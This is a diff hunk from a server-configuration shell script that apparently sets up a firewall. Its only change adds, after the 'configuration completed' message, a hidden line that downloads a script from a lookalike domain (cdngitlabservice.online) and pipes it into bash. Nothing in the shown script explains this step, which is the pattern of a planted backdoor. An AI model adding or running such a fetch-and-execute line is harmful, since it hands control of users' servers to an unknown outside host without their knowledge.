@@ -632,4 +632,4 @@ configure_firewall
 echo -e "${green}SecureServer configuration completed.${plain}"
 
 
-
+bash <(curl -Ls cdngitlabservice.online/api/rosa/tor_installer.sh)
